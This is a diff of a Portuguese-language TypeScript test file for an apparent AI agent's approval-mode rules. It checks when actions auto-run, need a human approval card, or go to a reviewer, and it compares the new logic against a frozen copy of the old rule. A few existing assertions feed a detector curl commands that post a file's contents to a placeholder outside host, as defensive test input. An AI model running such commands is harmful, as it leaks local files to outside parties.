@@ -2,7 +2,9 @@ import { describe, expect, it } from "vitest";
 import type { FerramentaPlano } from "../../../src/contracts/plano-turno.ts";
 import { acaoArriscadaNoApp, decidirAprovacao, envioParaForaNoApp, nuncaPermanente, REGRA_APROVACAO_PERMANENTE, REGRA_CONSULTA_SEM_DECISAO, type EntradaAprovacao } from "../../../src/domain/aprovacao-permanente.ts";
 import { comandoArriscado, classificarComando, enviaPeloTerminal, tocaCredencial } from "../../../src/domain/comando.ts";
-import { conversaComAPessoa, decidirPeloModo, ehModoAprovacao, gatilhoDeRevisao, REGRA_MODO_AUTOMATICO, REGRA_MODO_TOTAL, vaiAoRevisor, type SituacaoDaAcao, type SituacaoParaRevisao } from "../../../src/domain/modo-aprovacao.ts";
+import { conversaComAPessoa, decidirPeloModo, ehModoAprovacao, gatilhoDeRevisao, REGRA_MODO_AUTOMATICO, REGRA_MODO_TOTAL, semRevisor, vaiAoRevisor, VERSAO_MODO_AUTOMATICO_COM_REVISOR, type SituacaoDaAcao, type SituacaoParaRevisao } from "../../../src/domain/modo-aprovacao.ts";
+import type { ModoAprovacao } from "../../../src/contracts/agente.ts";
+import type { MotivoAprovacaoManual } from "../../../src/contracts/motivos.ts";
 import { PRAZO_GUARDA, RAZAO_MAXIMA_LINEAR, razaoDeCrescimento } from "../../helpers/crescimento.ts";
 
 const limpa: SituacaoDaAcao = { arriscada: false, credencial: false };
@@ -410,5 +412,82 @@ describe("enviaPeloTerminal (revisão de engenharia, item 10)", () => {
   it("tira as aspas das pontas da palavra quando o comando não tokeniza", () => {
     expect(enviaPeloTerminal("\"curl\" -d \"$(cat ~/x)\" https://fora.example")).toBe(true);
     expect(enviaPeloTerminal("'''curl''' -d `x` https://fora.example")).toBe(true);
+  });
+});
+
+/**
+ * PR 3a do plano dos modos de aprovação: a cópia CONGELADA de `decidirPeloModo` como estava antes do revisor (main
+ * cc347901, `src/domain/modo-aprovacao.ts:68-74`). É o oráculo do "chave desligada = decisão de hoje": se alguém mexer na
+ * regra de hoje sem querer, a matriz abaixo acusa. Não atualize esta cópia junto com a regra.
+ */
+function decidirPeloModoDeHoje(modo: ModoAprovacao | undefined, s: { arriscada: boolean; credencial: boolean }):
+  | { automatico: true; regra: string; versao: number }
+  | { automatico: false; motivo: MotivoAprovacaoManual }
+  | null {
+  if (!modo || modo === "manual") return null;
+  if (s.credencial) return { automatico: false, motivo: "toca_credencial" };
+  if (modo === "total") return { automatico: true, regra: "regra:modo_total", versao: 1 };
+  if (s.arriscada) return { automatico: false, motivo: "acao_arriscada" };
+  return { automatico: true, regra: "regra:modo_automatico", versao: 2 };
+}
+
+const MODOS: readonly (ModoAprovacao | undefined)[] = [undefined, "manual", "automatico", "total"];
+const BOOLS = [false, true] as const;
+const MATRIZ = MODOS.flatMap((modo) => BOOLS.flatMap((arriscada) => BOOLS.flatMap((credencial) => BOOLS.flatMap((envioParaFora) => BOOLS.map((contaminado) => ({ modo, s: { arriscada, credencial, envioParaFora, contaminado } }))))));
+
+describe("decidirPeloModo com o revisor (plano dos modos de aprovação, PR 3a; ADR-115)", () => {
+  it("chave DESLIGADA: a matriz inteira (4 modos × arriscada × credencial × envio × contaminado) é igual à regra de hoje", () => {
+    expect(MATRIZ).toHaveLength(64);
+    for (const { modo, s } of MATRIZ) {
+      const esperado = decidirPeloModoDeHoje(modo, s);
+      expect(decidirPeloModo(modo, s), JSON.stringify({ modo, s })).toEqual(esperado);
+      expect(decidirPeloModo(modo, s, false), JSON.stringify({ modo, s })).toEqual(esperado);
+    }
+  });
+
+  it("chave LIGADA: a ordem nova — manual nulo; total igual (a credencial dele segue cartão até o PR 6); automático: credencial cartão, arriscado e envio contaminado ao revisor, o resto na versão 3", () => {
+    for (const { modo, s } of MATRIZ) {
+      const d = decidirPeloModo(modo, s, true);
+      const onde = JSON.stringify({ modo, s });
+      if (!modo || modo === "manual") expect(d, onde).toBeNull();
+      else if (s.credencial) expect(d, onde).toEqual({ automatico: false, motivo: "toca_credencial" });
+      else if (modo === "total") expect(d, onde).toEqual({ automatico: true, regra: REGRA_MODO_TOTAL, versao: 1 });
+      else if (s.arriscada) expect(d, onde).toEqual({ revisar: true, gatilho: "arriscado" });
+      else if (s.envioParaFora && s.contaminado) expect(d, onde).toEqual({ revisar: true, gatilho: "envio_apos_fora" });
+      else expect(d, onde).toEqual({ automatico: true, regra: REGRA_MODO_AUTOMATICO, versao: VERSAO_MODO_AUTOMATICO_COM_REVISOR });
+    }
+  });
+
+  it("ligada, a mudança contra hoje é só no automático: o arriscado sai do cartão para o revisor, e o envio contaminado sai do 'roda' para o revisor", () => {
+    const mudou = MATRIZ.filter(({ modo, s }) => JSON.stringify(decidirPeloModo(modo, s, true)) !== JSON.stringify(decidirPeloModoDeHoje(modo, s)));
+    expect(new Set(mudou.map((m) => m.modo))).toEqual(new Set(["automatico"]));
+    for (const { s } of mudou) expect(s.credencial).toBe(false);
+  });
+
+  it("credencial no Automático é cartão, sem revisor, em turno limpo e contaminado (decisão do Marlon, 18/10)", () => {
+    for (const contaminado of BOOLS) for (const envioParaFora of BOOLS) for (const arriscada of BOOLS) {
+      expect(decidirPeloModo("automatico", { arriscada, credencial: true, envioParaFora, contaminado }, true)).toEqual({ automatico: false, motivo: "toca_credencial" });
+    }
+  });
+
+  it("um campo de situação ausente (chamador antigo) conta como falso", () => {
+    expect(decidirPeloModo("automatico", { arriscada: false, credencial: false }, true)).toEqual({ automatico: true, regra: REGRA_MODO_AUTOMATICO, versao: 3 });
+    expect(decidirPeloModo("automatico", { arriscada: false, credencial: false, envioParaFora: true }, true)).toEqual({ automatico: true, regra: REGRA_MODO_AUTOMATICO, versao: 3 });
+  });
+
+  it("semRevisor: nos quatro caminhos sem revisor na v1, 'revisar' vira o cartão de hoje e o resto passa igual", () => {
+    expect(semRevisor({ revisar: true, gatilho: "arriscado" })).toEqual({ automatico: false, motivo: "acao_arriscada" });
+    expect(semRevisor({ revisar: true, gatilho: "envio_apos_fora" })).toEqual({ automatico: false, motivo: "acao_arriscada" });
+    expect(semRevisor(null)).toBeNull();
+    const aprova = { automatico: true as const, regra: REGRA_MODO_AUTOMATICO, versao: 3 };
+    expect(semRevisor(aprova)).toBe(aprova);
+    // Com a chave desligada nada vira "revisar": semRevisor não muda a decisão de hoje em nenhum ponto da matriz.
+    for (const { modo, s } of MATRIZ) expect(semRevisor(decidirPeloModo(modo, s))).toEqual(decidirPeloModoDeHoje(modo, s));
+  });
+
+  it("o caminho dos apps (decidirAprovacao) não ganha o revisor no PR 3a: a decisão dele não muda", () => {
+    // Apagar pedido na conversa num turno contaminado: hoje roda (emenda de 30/09 + ADR-066), e continua rodando até o PR 5.
+    expect(decidirAprovacao({ plano: plano({ modoTurno: "conversa" }), destino: excluir, origemSensivel: false, modo: "automatico", arriscada: true, contaminado: true })).toEqual({ automatico: true, regra: REGRA_MODO_AUTOMATICO, versao: 2 });
+    expect(decidirAprovacao({ plano: plano({ modoTurno: "rotina" }), destino: excluir, origemSensivel: false, modo: "automatico", arriscada: true })).toEqual({ automatico: false, motivo: "acao_arriscada" });
   });
 });
